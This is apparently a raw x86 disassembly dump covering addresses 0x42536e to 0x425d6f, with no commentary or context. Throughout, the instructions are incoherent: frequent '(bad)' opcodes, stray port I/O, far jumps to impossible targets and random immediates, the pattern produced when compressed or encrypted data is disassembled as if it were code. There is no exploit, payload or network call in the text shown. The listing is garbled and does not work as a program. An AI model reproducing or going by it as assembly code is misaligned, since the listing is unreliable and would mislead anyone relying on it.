  42536e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42536f:	jle    0x4252fe
  425371:	push   0x5ff0272b
  425376:	mov    eax,0xad8609ef
  42537b:	adc    ebx,DWORD PTR [edi+0x6f]
  42537e:	sub    edx,DWORD PTR [ecx+edi*1+0x6ff7808c]
  425385:	ror    DWORD PTR [edi-0x20],0xe6
  425389:	nop
  42538a:	jno    0x425364
  42538c:	(bad)  
  42538d:	jecxz  0x425388
  42538f:	mov    es:0xf79cde28,eax
  425395:	scas   al,BYTE PTR es:[edi]
  425396:	jb     0x4253f0
  425398:	push   ebp
  425399:	xchg   edx,eax
  42539a:	xchg   esp,eax
  42539b:	in     al,dx
  42539c:	adc    al,0x6c
  42539e:	sbb    BYTE PTR [ebx],ch
  4253a0:	xor    cl,BYTE PTR [esi-0x32]
  4253a3:	popf   
  4253a4:	(bad)  
  4253a5:	xlat   BYTE PTR ds:[ebx]
  4253a6:	add    al,0x2e
  4253a8:	call   DWORD PTR [ebp+0x437b02ef]
  4253ae:	icebp  
  4253af:	mov    ds:0x1fa56416,eax
	...
  425415:	add    BYTE PTR [edx+0x9],al
  425418:	les    ebp,FWORD PTR [ecx-0x14901231]
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	push   ebp
  425423:	pop    es
  425424:	xor    DWORD PTR [ecx],0xfffffffc
  425427:	mov    WORD PTR [ecx],es
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [esi],dh
  42542f:	push   esi
  425430:	sar    BYTE PTR [ebp-0x61828c9c],cl
  425436:	retf   
  425437:	jnp    0x425426
  425439:	mov    ch,0x27
  42543b:	pop    edx
  42543c:	and    al,0x14
  42543e:	lods   eax,DWORD PTR ds:[esi]
  42543f:	push   ecx
  425440:	mov    dl,0x35
  425442:	in     eax,dx
  425443:	push   ecx
  425444:	mov    dh,0x96
  425446:	daa    
  425447:	mov    WORD PTR [edx-0x71],ss
  42544a:	cli    
  42544b:	pushf  
  42544c:	adc    eax,0xe5582d78
  425451:	xlat   BYTE PTR ds:[ebx]
  425452:	xchg   edx,eax
  425453:	ja     0x425454
  425455:	xchg   ecx,ecx
  425457:	loop   0x425474
  425459:	sub    DWORD PTR fs:[ecx+0x35],edx
  42545d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42545e:	push   cs
  42545f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425460:	fwait
  425461:	shl    DWORD PTR [edx-0x80],0xef
  425465:	sbb    bh,al
  425467:	xchg   ecx,eax
  425468:	sub    ebx,DWORD PTR [edi-0x39]
  42546b:	mov    edi,0xa4f80161
  425470:	xchg   esp,eax
  425471:	out    0x93,eax
  425473:	xor    ebp,edi
  425475:	imul   eax,DWORD PTR [ebx+ebx*1],0xdbc669e6
  42547c:	pop    esi
  42547d:	daa    
  42547e:	dec    ebp
  42547f:	and    dh,al
  425481:	dec    ebp
  425482:	sub    ch,al
  425484:	(bad)  
  425485:	std    
  425486:	(bad)  
  425487:	bnd jo 0x4254cc
  42548a:	test   BYTE PTR [ebp+0x69],0x31
  42548e:	or     eax,0x9adef898
  425493:	lods   eax,DWORD PTR ds:[esi]
  425494:	in     al,dx
  425495:	or     al,0x21
  425497:	pop    ebx
  425498:	xchg   BYTE PTR [ecx-0x53],ah
  42549b:	mov    WORD PTR [ecx],cs
  42549d:	adc    ebp,ebp
  42549f:	adc    BYTE PTR [edi+0xeaa156c],bh
  4254a5:	in     eax,0xcb
  4254a7:	push   edx
  4254a8:	jnp    0x42544d
  4254aa:	fistp  WORD PTR [esi-0x2c]
  4254ad:	not    DWORD PTR [esi]
  4254af:	mov    BYTE PTR [eax],ch
  4254b1:	(bad)  
  4254b2:	in     eax,dx
  4254b3:	sub    al,0xa5
  4254b5:	jo     0x425502
  4254b7:	pop    es
  4254b8:	jmp    0x1c84482b
  4254bd:	push   es
  4254be:	push   ebx
  4254bf:	lds    ebx,FWORD PTR [ecx+ebp*2]
  4254c2:	fisttp QWORD PTR ds:0x841f1a05
  4254c8:	(bad)  [edx+0x6]
  4254cb:	add    ecx,DWORD PTR [ebx-0x5c]
  4254ce:	cmp    bl,BYTE PTR [edi]
  4254d0:	sahf   
  4254d1:	sub    bh,BYTE PTR [eax-0x6d]
  4254d4:	je     0x4254e8
  4254d6:	in     al,dx
  4254d7:	mov    edx,0x866a2423
  4254dc:	or     eax,0x52f62611
  4254e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254e2:	lahf   
  4254e3:	add    BYTE PTR [ecx],cl
  4254e5:	outs   dx,DWORD PTR ds:[esi]
  4254e6:	adc    ebp,eax
  4254e8:	in     eax,dx
  4254e9:	jns    0x4254fc
  4254eb:	fdiv   st,st(1)
  4254ed:	push   ss
  4254ee:	adc    edi,DWORD PTR [esi+eiz*2+0x307cf62]
  4254f5:	fs (bad) 
  4254f8:	pop    edi
  4254f9:	leave  
  4254fa:	cs (bad) 
  4254fc:	(bad)  
  4254fe:	imul   ebp,eax,0x6d
  425501:	test   bh,bl
  425503:	aad    0xdf
  425505:	sub    ebp,DWORD PTR [ecx]
  425507:	xor    edx,DWORD PTR [edi+ebp*1]
  42550a:	mov    dh,0xc0
  42550c:	loop   0x4254db
  42550e:	push   eax
  42550f:	not    BYTE PTR [esi+ebx*1+0x5e]
  425513:	nop
  425514:	pushf  
  425515:	pop    edi
  425516:	jno    0x42553a
  425518:	jne    0x425594
  42551a:	sti    
  42551b:	or     BYTE PTR [edx],cl
  42551d:	imul   esi,DWORD PTR ds:0x91f1c91d,0x1f
  425524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425525:	adc    ebp,edi
  425527:	icebp  
  425528:	data16 xor al,0x62
  42552b:	pop    esp
  42552c:	stc    
  42552d:	jl     0x42553a
  42552f:	shl    ch,cl
  425531:	pop    esi
  425532:	sub    bh,BYTE PTR [ecx]
  425534:	dec    eax
	...
  425595:	add    ah,al
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x1ac6
  4255a3:	mov    dh,0x4d
  4255a5:	retf   0x8e03
  4255a8:	add    DWORD PTR [eax],eax
  4255aa:	pop    es
  4255ab:	add    DWORD PTR [eax],eax
  4255ad:	add    BYTE PTR [esi],dl
  4255af:	daa    
  4255b0:	cmp    DWORD PTR [edi],0x3bfa79f8
  4255b6:	mov    WORD PTR [ecx+0x7b],?
  4255b9:	cmp    esp,DWORD PTR fs:[ecx]
  4255bc:	fbld   TBYTE PTR [eax-0x3c]
  4255bf:	sub    BYTE PTR ds:0xe9d05811,ch
  4255c5:	fld    TBYTE PTR [edx+0x68]
  4255c8:	ror    BYTE PTR [edi],0x31
  4255cb:	frstor [edi]
  4255cd:	shr    DWORD PTR [ebx+0x6e],1
  4255d0:	daa    
  4255d1:	sub    DWORD PTR [edx],ebx
  4255d3:	push   edx
  4255d4:	(bad)  
  4255d6:	ins    BYTE PTR es:[edi],dx
  4255d7:	mov    esp,fs
  4255d9:	adc    al,BYTE PTR [eax]
  4255db:	jno    0x425642
  4255dd:	jmp    0x425584
  4255df:	rol    BYTE PTR [ebx],1
  4255e1:	inc    esi
  4255e2:	lods   al,BYTE PTR ds:[esi]
  4255e3:	mov    eax,ds:0xcd45cc04
  4255e8:	ins    BYTE PTR es:[edi],dx
  4255e9:	jb     0x42558a
  4255eb:	add    BYTE PTR [ecx+eax*2],dl
  4255ee:	or     edi,esp
  4255f0:	jl     0x4255a6
  4255f2:	mov    cl,0x25
  4255f4:	das    
  4255f5:	es stos DWORD PTR es:[edi],eax
  4255f7:	nop
  4255f8:	ins    DWORD PTR es:[edi],dx
  4255f9:	inc    edx
  4255fa:	outs   dx,DWORD PTR ds:[esi]
  4255fb:	xchg   ebx,eax
  4255fc:	jns    0x4255a7
  4255fe:	add    edx,ecx
  425600:	popa   
  425601:	jl     0x425626
  425603:	push   ecx
  425604:	ret    
  425605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425606:	adc    dl,ah
  425608:	dec    edx
  425609:	xchg   DWORD PTR [edi-0x401eb935],esp
  42560f:	lods   eax,DWORD PTR ds:[esi]
  425610:	enter  0x57b8,0xb1
  425614:	cmp    esi,0x67e3c245
  42561a:	adc    ch,BYTE PTR [ecx]
  42561c:	sbb    dl,BYTE PTR [esi+ecx*1]
  42561f:	sub    eax,0x879323a6
  425624:	aaa    
  425625:	into   
  425626:	mov    eax,0x8f841d3c
  42562b:	pop    eax
  42562c:	icebp  
  42562d:	cs cmp al,0xa0
  425630:	jge    0x42567e
  425632:	cmp    al,0x6a
  425634:	mov    BYTE PTR [ebx],dl
  425636:	sbb    DWORD PTR [edx+edi*4+0x34],ebp
  42563a:	mov    esp,0xbc03ecb9
  42563f:	rcr    esp,0xe7
  425642:	jae    0x4256b5
  425644:	inc    esp
  425645:	rcl    DWORD PTR [eax+0x58],1
  425648:	scas   al,BYTE PTR es:[edi]
  425649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42564a:	in     eax,0x78
  42564c:	jo     0x4255f3
  42564e:	cmp    eax,0x5ad90c8e
  425653:	(bad)  
  425654:	arpl   WORD PTR [edx],dx
  425656:	adc    al,0xa8
  425658:	into   
  425659:	jbe    0x4256cc
  42565b:	mov    ecx,0xe70b7f22
  425660:	sbb    bh,BYTE PTR [ecx+0x15d282b3]
  425666:	in     eax,dx
  425667:	adc    eax,0x2187d002
  42566c:	xor    eax,0xb383d4e3
  425671:	imul   ebp,DWORD PTR [eax+0x5ce639c6],0xa600e6ca
  42567b:	inc    edi
  42567c:	leave  
  42567d:	jo     0x42561a
  42567f:	fdiv   QWORD PTR [eax-0x1af133e7]
  425685:	mov    dh,0x3b
  425687:	jbe    0x4256a6
  425689:	and    BYTE PTR [ebx-0x71],ch
  42568c:	dec    edx
  42568d:	iret   
  42568e:	hlt    
  42568f:	mov    ebx,fs
  425691:	jae    0x425625
  425693:	xor    edx,esi
  425695:	shl    BYTE PTR [ebx],cl
  425697:	sti    
  425698:	push   ebp
  425699:	inc    ebp
  42569a:	mov    WORD PTR [ecx+0x7d06b39e],cs
  4256a0:	nop
  4256a1:	shl    BYTE PTR [ebx+0x287484ef],0x3
  4256a8:	or     ebp,DWORD PTR [esi]
  4256aa:	pop    esi
  4256ab:	jnp    0x42567c
  4256ad:	lahf   
  4256ae:	push   esp
  4256af:	in     al,0x7a
  4256b1:	adc    al,BYTE PTR [eax+0x3d]
  4256b4:	jne    0x4256b6
	...
  425716:	(bad)  
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx-0x5e60fa2c],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	sub    BYTE PTR [esi+0x29e2aece],al
  425734:	jmp    0x9f8b:0xcbf2274f
  42573b:	xor    ebx,ebp
  42573d:	inc    ecx
  42573e:	jo     0x4256d6
  425740:	and    dl,BYTE PTR [ebp+0x38cee9ee]
  425746:	clc    
  425747:	sub    al,0xf3
  425749:	std    
  42574a:	sbb    BYTE PTR [edx+0x78],0xa9
  42574e:	and    eax,0xe8db24c1
  425753:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  425755:	push   ebx
  425756:	mov    ch,0xb6
  425758:	fcmovu st,st(0)
  42575a:	mov    esi,0x2efaa0ac
  42575f:	nop
  425760:	xor    bh,BYTE PTR [esi-0x3c]
  425763:	mov    eax,ds:0x34c39ad8
  425768:	out    dx,al
  425769:	xchg   esp,eax
  42576a:	sahf   
  42576b:	push   ds
  42576c:	dec    ecx
  42576d:	pop    edx
  42576e:	idiv   ebx
  425770:	je     0x425709
  425772:	jecxz  0x42574a
  425774:	mov    ch,0x9c
  425776:	jle    0x425706
  425778:	mov    ebp,0x359217e0
  42577d:	icebp  
  42577e:	jns    0x425792
  425780:	dec    ebp
  425781:	mov    esi,0xbbc7f3f6
  425786:	jmp    0x5737d4ee
  42578b:	clc    
  42578c:	sti    
  42578d:	mov    dl,0xc5
  42578f:	push   ebp
  425790:	pop    ebp
  425791:	jmpw   0xe337
  425795:	dec    eax
  425796:	fstp   TBYTE PTR [eax+0x7811c12c]
  42579c:	xor    eax,0xc37bb6cc
  4257a1:	or     DWORD PTR [esi+0x42],esp
  4257a4:	sub    bh,BYTE PTR [edi-0x23f8cab5]
  4257aa:	xor    bl,BYTE PTR [eax+0x29]
  4257ad:	sbb    BYTE PTR [eax],dl
  4257af:	xchg   al,al
  4257b1:	or     BYTE PTR [ecx+0x22],0x31
  4257b5:	loope  0x42575a
  4257b7:	retf   0xe2a1
  4257ba:	mov    cl,0xda
  4257bc:	or     al,0x8
  4257be:	jbe    0x425762
  4257c0:	retf   0x74e
  4257c3:	out    dx,eax
  4257c4:	retf   
  4257c5:	inc    edx
  4257c6:	mov    eax,ds:0xb96e1b90
  4257cb:	cmp    BYTE PTR [ebx+eax*8],0x97
  4257cf:	out    dx,al
  4257d0:	add    al,0xc
  4257d2:	add    al,BYTE PTR [esi]
  4257d4:	int    0x20
  4257d6:	mov    al,ds:0x4eb1a807
  4257db:	jae    0x4257a9
  4257dd:	ja     0x425784
  4257df:	fcomp  DWORD PTR [edx-0x8e4c36f]
  4257e5:	js     0x4257f8
  4257e7:	mov    esi,0xe922549b
  4257ec:	sbb    BYTE PTR [esi],0xc6
  4257ef:	xchg   esi,eax
  4257f0:	enter  0xf64c,0x78
  4257f4:	mov    ecx,esp
  4257f6:	clc    
  4257f7:	ins    DWORD PTR es:[edi],dx
  4257f8:	push   ss
  4257f9:	frstor [esi-0xc]
  4257fc:	mov    BYTE PTR [ebx],cl
  4257fe:	ds mov cl,0x5f
  425801:	and    al,0x94
  425803:	push   ebp
  425804:	or     esi,DWORD PTR [edi+0x1]
  425807:	sub    eax,DWORD PTR [esi+0x5cbb0a3b]
  42580d:	add    ebx,edi
  42580f:	dec    ebx
  425810:	sub    BYTE PTR [eax+0x56],cl
  425813:	fcom   QWORD PTR [edx]
  425815:	loopne 0x425868
  425817:	inc    esi
  425818:	sbb    bh,BYTE PTR [eax-0x2a]
  42581b:	pushf  
  42581c:	xchg   edi,eax
  42581d:	sbb    DWORD PTR [ecx],ecx
  42581f:	or     bh,bl
  425821:	in     al,0x4b
  425823:	mov    dh,0x54
  425825:	pop    esi
  425826:	dec    ecx
  425827:	inc    esp
  425828:	rol    bh,1
  42582a:	xor    eax,0x61
  42582d:	xor    eax,0xc9bead7f
  425832:	rol    BYTE PTR [ecx-0x47],0x0
	...
  425896:	pop    esp
  425897:	push   edx
  425898:	nop
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0x6044ec2d,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	test   BYTE PTR [ebp-0x1cb93e6a],0xeb
  4258b5:	call   0x7950:0xcd57f10e
  4258bc:	aad    0xf5
  4258be:	sbb    BYTE PTR [esi*4+0x3f6b1078],bl
  4258c5:	pusha  
  4258c6:	std    
  4258c7:	and    eax,0x642d4505
  4258cc:	sbb    al,0xe4
  4258ce:	xor    ecx,esi
  4258d0:	mov    ss,WORD PTR [edi]
  4258d2:	sub    eax,0x23a6677c
  4258d7:	stos   BYTE PTR es:[edi],al
  4258d8:	dec    esi
  4258d9:	jmp    0xbb889a69
  4258de:	and    esi,ebp
  4258e0:	(bad)
  4258e4:	pop    edi
  4258e5:	retf   
  4258e6:	dec    ebp
  4258e7:	mov    ebp,0xf37323cb
  4258ec:	mov    ds:0xc7af061a,al
  4258f1:	gs stos DWORD PTR es:[edi],eax
  4258f3:	xchg   al,bl
  4258f5:	jo     0x42591f
  4258f7:	mov    bl,0x21
  4258f9:	push   ebp
  4258fa:	lods   eax,DWORD PTR ds:[esi]
  4258fb:	mov    esi,0x163c0374
  425900:	in     eax,dx
  425901:	test   al,0xdd
  425903:	xor    esi,DWORD PTR [ebp+0x167be658]
  425909:	fisubr DWORD PTR [ebx-0x787718f6]
  42590f:	mov    ds:0xed54efc8,al
  425914:	push   eax
  425915:	push   esp
  425916:	loopne 0x425912
  425918:	stc    
  425919:	das    
  42591a:	and    edi,edi
  42591c:	mov    bl,0x37
  42591e:	push   ebp
  42591f:	outs   dx,BYTE PTR ds:[esi]
  425920:	push   edi
  425921:	cmp    ebx,DWORD PTR [esi+0x66]
  425924:	stos   DWORD PTR es:[edi],eax
  425925:	retf   
  425926:	inc    esi
  425927:	pop    esp
  425928:	pop    ss
  425929:	ss dec ebp
  42592b:	fsub   st(6),st
  42592d:	cmp    ah,bh
  42592f:	arpl   WORD PTR [edx],sp
  425931:	pop    ebp
  425932:	mov    bl,0xff
  425934:	cld    
  425935:	clc    
  425936:	ds in  eax,dx
  425938:	test   DWORD PTR [eax],edx
  42593a:	das    
  42593b:	xchg   ecx,eax
  42593c:	pop    esi
  42593d:	sub    DWORD PTR [esi],0xffffffad
  425940:	jle    0x42595a
  425942:	jb     0x4259a8
  425944:	and    eax,0x7e22161f
  425949:	loop   0x4259b6
  42594b:	fcmovnbe st,st(4)
  42594d:	or     eax,0x8acdac77
  425952:	pop    esp
  425953:	sahf   
  425954:	jne    0x425979
  425956:	test   BYTE PTR [edi+edx*1],ch
  425959:	cs add al,0x1c
  42595c:	aam    0xd3
  42595e:	and    cl,al
  425960:	cmc    
  425961:	(bad)  
  425962:	stc    
  425963:	call   0xa164eaf4
  425968:	les    edi,FWORD PTR [ebp+0x34]
  42596b:	cmp    BYTE PTR [eax+0x3c],al
  42596e:	lock xor dh,dl
  425971:	or     ah,bl
  425973:	adc    eax,0x8a5be38
  425978:	fistp  QWORD PTR ds:0x4e400405
  42597e:	lods   al,BYTE PTR ds:[esi]
  42597f:	leave  
  425980:	imul   eax,DWORD PTR [ecx-0x35],0xc2554ccd
  425987:	cmp    eax,0x1b51bcf3
  42598c:	jecxz  0x425a00
  42598e:	popf   
  42598f:	mov    WORD PTR [esi+0x16],ss
  425992:	push   esp
  425993:	loope  0x4259b6
  425995:	jns    0x4259fe
  425997:	xor    DWORD PTR [edi+0x2e],esi
  42599a:	mov    ds:0x62a79f2c,eax
  42599f:	mov    ebp,0x94f5d727
  4259a4:	ja     0x4259bb
  4259a6:	mov    edx,0xbf60dcd5
  4259ab:	mov    edx,0xc3eec06d
  4259b0:	mov    bh,0x6b
  4259b2:	in     eax,0x6a
  4259b4:	add    BYTE PTR [eax],0x0
	...
  425a13:	add    BYTE PTR [eax],al
  425a15:	add    cl,al
  425a17:	arpl   WORD PTR [edi+eiz*2],ax
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x7836fe11
  425a24:	mov    dh,0x1
  425a26:	sbb    BYTE PTR [ecx+0x1070001],dl
  425a2c:	add    BYTE PTR [eax],al
  425a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a2f:	cs je  0x425aa6
  425a32:	cmp    DWORD PTR [ecx-0x31d8e973],esi
  425a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a39:	aaa    
  425a3a:	ret    0x6a4a
  425a3d:	xchg   ecx,eax
  425a3e:	xchg   ebp,eax
  425a3f:	(bad)  
  425a41:	jl     0x425a74
  425a43:	add    dh,dh
  425a45:	out    dx,eax
  425a46:	test   eax,0x62412016
  425a4b:	retf   0xede6
  425a4e:	imul   ebp,edi,0xb
  425a51:	push   ss
  425a52:	mov    cl,0x27
  425a54:	rol    DWORD PTR [esi-0x44ed7d11],1
  425a5a:	hlt    
  425a5b:	push   cs
  425a5c:	shl    BYTE PTR [esi],1
  425a5e:	sbb    al,0x25
  425a60:	jecxz  0x425a29
  425a62:	mov    ebx,0x9dec5c48
  425a67:	das    
  425a68:	ins    DWORD PTR es:[edi],dx
  425a69:	push   cs
  425a6a:	gs mov esi,0x412f4c5
  425a70:	sbb    esp,DWORD PTR [ebp+0x44]
  425a73:	call   0x234c:0x8a5308a7
  425a7a:	push   edx
  425a7b:	outs   dx,BYTE PTR ds:[esi]
  425a7c:	pop    ss
  425a7d:	or     DWORD PTR [ecx-0x44],ecx
  425a80:	dec    ebx
  425a81:	jnp    0x425a46
  425a83:	cld    
  425a84:	push   ebx
  425a85:	cld    
  425a86:	(bad)  
  425a87:	out    dx,eax
  425a88:	mov    al,0x87
  425a8a:	mov    al,0xba
  425a8c:	jmp    DWORD PTR [ecx+0x53]
  425a8f:	lahf   
  425a90:	mov    es,WORD PTR gs:[eax-0x661a80e2]
  425a97:	jle    0x425afc
  425a99:	outs   dx,DWORD PTR ds:[esi]
  425a9a:	push   eax
  425a9b:	mov    al,0xe6
  425a9d:	mov    ds:0xf4ed0cb4,al
  425aa2:	cld    
  425aa3:	mov    ah,0x91
  425aa5:	idiv   DWORD PTR [edx+ecx*8+0x12ed97b]
  425aac:	ficomp WORD PTR [edx]
  425aae:	xor    BYTE PTR [ebx-0xa89356],dh
  425ab4:	mov    dh,0x24
  425ab6:	or     DWORD PTR [edi],ebx
  425ab8:	leave  
  425ab9:	std    
  425aba:	and    al,0x96
  425abc:	cld    
  425abd:	mov    eax,ds:0x43d9bbb5
  425ac2:	sub    dl,cl
  425ac4:	stos   DWORD PTR es:[edi],eax
  425ac5:	mov    ch,0x16
  425ac7:	mov    al,ds:0x21655f99
  425acc:	dec    ebp
  425acd:	cmp    DWORD PTR [ebx-0x12],esi
  425ad0:	or     BYTE PTR [edx-0x64],ch
  425ad3:	fcmovbe st,st(3)
  425ad5:	sbb    ebx,DWORD PTR [edx+0x4c09b1d2]
  425adb:	cdq    
  425adc:	inc    esi
  425add:	xor    DWORD PTR [edx+0x67],edi
  425ae0:	mov    bl,0x5
  425ae2:	pop    esp
  425ae3:	or     al,0xac
  425ae5:	mov    ds:0x6ddc497a,al
  425aea:	sbb    al,0x25
  425aec:	xchg   ebx,eax
  425aed:	push   esi
  425aee:	sbb    ecx,DWORD PTR [ebx+0xe9068c3]
  425af4:	lods   eax,DWORD PTR ds:[esi]
  425af5:	and    BYTE PTR [eax],0x85
  425af8:	jbe    0x425aa6
  425afa:	ret    0xccbf
  425afd:	mul    BYTE PTR [eax-0x6f89ff3]
  425b03:	mov    ecx,0x62c95e26
  425b08:	xchg   esp,eax
  425b09:	mov    ds:0x5c059819,al
  425b0e:	leave  
  425b0f:	sub    al,0xf8
  425b11:	push   ebp
  425b12:	sub    eax,0xdc1e1a07
  425b17:	shl    DWORD PTR [ecx+0x59],0x0
  425b1b:	xor    esi,eax
  425b1d:	sub    ecx,DWORD PTR [ebp-0x73]
  425b20:	sbb    eax,DWORD PTR [edx+eiz*2]
  425b23:	mov    ds:0x66c8d540,eax
  425b28:	loope  0x425b49
  425b2a:	jmp    0x425b82
  425b2c:	(bad)  
  425b2d:	push   eax
  425b2e:	in     eax,0x3b
  425b30:	sahf   
  425b31:	pop    es
  425b32:	out    0xcc,al
  425b34:	in     eax,dx
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x9da5aad3
  425ba3:	aas    
  425ba4:	ins    BYTE PTR es:[edi],dx
  425ba5:	xor    BYTE PTR [edi],bl
  425ba7:	xchg   edx,eax
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [edx-0x327bea56],al
  425bb3:	inc    edi
  425bb4:	loop   0x425b74
  425bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bb7:	jecxz  0x425bae
  425bb9:	ret    
  425bba:	dec    esi
  425bbb:	push   cs
  425bbc:	jo     0x425c28
  425bbe:	enter  0xc426,0x92
  425bc2:	pop    ecx
  425bc3:	shl    DWORD PTR [ebx-0x20],cl
  425bc6:	mov    ch,0x7a
  425bc8:	loope  0x425b9f
  425bca:	sbb    eax,0x6556dbb4
  425bcf:	dec    ecx
  425bd0:	xor    eax,0x416ded60
  425bd5:	sub    al,0xc5
  425bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bd8:	push   ebx
  425bd9:	mov    dh,0xc3
  425bdb:	rol    edx,cl
  425bdd:	dec    eax
  425bde:	cmp    bl,dl
  425be0:	int3   
  425be1:	mov    al,ds:0x4a95f9dc
  425be6:	ins    DWORD PTR es:[edi],dx
  425be7:	jno    0x425b99
  425be9:	add    eax,0x8874e3df
  425bee:	sbb    ah,BYTE PTR [ebx+0x1e9b2478]
  425bf4:	mov    ebx,0xe507b210
  425bf9:	stos   DWORD PTR es:[edi],eax
  425bfa:	jmp    0x80ac:0x1570c8a7
  425c01:	shl    BYTE PTR [esi],cl
  425c03:	jecxz  0x425c0e
  425c05:	cmc    
  425c06:	cwde   
  425c07:	loop   0x425b98
  425c09:	xchg   edi,eax
  425c0a:	push   eax
  425c0b:	mov    DWORD PTR [ebx+0x2],edx
  425c0e:	popa   
  425c0f:	pop    ebx
  425c10:	add    DWORD PTR [edx+0x74],ebp
  425c13:	jne    0x425bea
  425c15:	cmp    eax,0x869ace70
  425c1a:	pop    esp
  425c1b:	pusha  
  425c1c:	dec    ecx
  425c1d:	inc    ebx
  425c1e:	(bad)
  425c22:	pop    es
  425c23:	mov    edx,0xa9fd0dd3
  425c28:	fdivr  DWORD PTR [edi+ecx*2]
  425c2b:	dec    ebp
  425c2c:	icebp  
  425c2d:	sub    eax,0xd89f6d7f
  425c32:	je     0x425c18
  425c34:	stos   DWORD PTR es:[edi],eax
  425c35:	retf   
  425c36:	test   eax,0xcfcfa235
  425c3b:	sub    ebx,ebx
  425c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c3e:	ins    DWORD PTR es:[edi],dx
  425c3f:	sbb    al,0xd3
  425c41:	lock call FWORD PTR [eax-0x5e8d3bd6]
  425c48:	popa   
  425c49:	xor    DWORD PTR [edi-0x6aaadbfd],ecx
  425c4f:	cs jecxz 0x425c13
  425c52:	fsub   DWORD PTR [ecx+ecx*8+0x29]
  425c56:	popa   
  425c57:	sub    ebp,esi
  425c59:	out    dx,eax
  425c5a:	adc    bl,al
  425c5c:	fimul  DWORD PTR [ebx+ecx*2-0x5a]
  425c60:	mov    dl,0xbe
  425c62:	push   ebp
  425c63:	cld    
  425c64:	test   BYTE PTR [esi],ch
  425c66:	cwde   
  425c67:	pop    ds
  425c68:	xor    DWORD PTR [edi-0x3a],0xffffffa2
  425c6c:	out    dx,al
  425c6d:	push   esi
  425c6e:	popa   
  425c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c70:	mov    eax,ds:0x8d69ff5e
  425c75:	jecxz  0x425c34
  425c77:	jmp    0x434378a4
  425c7c:	sar    DWORD PTR [esi],1
  425c7e:	ja     0x425c0d
  425c80:	xchg   cl,cl
  425c82:	dec    edi
  425c83:	adc    DWORD PTR [eax],eax
  425c85:	hlt    
  425c86:	mov    ch,0x1c
  425c88:	jmp    0xef1e2f12
  425c8d:	dec    ecx
  425c8e:	je     0x425c91
  425c90:	scas   eax,DWORD PTR es:[edi]
  425c91:	addr16 cmp eax,0xf3dd764b
  425c97:	test   dl,al
  425c99:	arpl   WORD PTR [ebx-0x5a],bp
  425c9c:	ja     0x425cb3
  425c9e:	push   edx
  425c9f:	xor    edx,DWORD PTR [eax]
  425ca1:	psraw  mm7,QWORD PTR [eax-0x6f961130]
  425ca8:	bound  ecx,QWORD PTR [edi]
  425caa:	lahf   
  425cab:	inc    eax
  425cac:	ret    0x323d
  425caf:	xchg   edx,eax
  425cb0:	jmp    0x0:0x580166
	...
  425d13:	add    BYTE PTR [eax],al
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0xff
  425d23:	sbb    al,0xfb
  425d25:	daa    
  425d26:	es xchg ebx,eax
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    al,dl
  425d2f:	clc    
  425d30:	xor    BYTE PTR [edx],dh
  425d32:	ins    DWORD PTR es:[edi],dx
  425d33:	int3   
  425d34:	xchg   ecx,eax
  425d35:	sahf   
  425d36:	mov    cl,0x40
  425d38:	pushf  
  425d39:	xor    eax,0x5cb969ce
  425d3e:	fstp   QWORD PTR [edx]
  425d40:	not    eax
  425d42:	add    eax,0x7e4e4ad9
  425d47:	pop    ds
  425d48:	imul   ebx
  425d4a:	shl    BYTE PTR [esi+0x6172a7e4],cl
  425d50:	stc    
  425d51:	pop    ebx
  425d52:	mov    DWORD PTR [edi-0x6f],ecx
  425d55:	jns    0x425dcc
  425d57:	push   esi
  425d58:	lds    ebp,FWORD PTR [ecx-0x10]
  425d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d5c:	dec    ebp
  425d5d:	js     0x425d8a
  425d5f:	bound  esp,QWORD PTR [esi+0x1d]
  425d62:	xor    dh,bh
  425d64:	ja     0x425d5f
  425d66:	iret   
  425d67:	ficom  DWORD PTR [ecx-0x2f]
  425d6a:	hlt    
  425d6b:	arpl   WORD PTR [eax],si
  425d6d:	js     0x425d2a
  425d6f:	jg     0x425db4
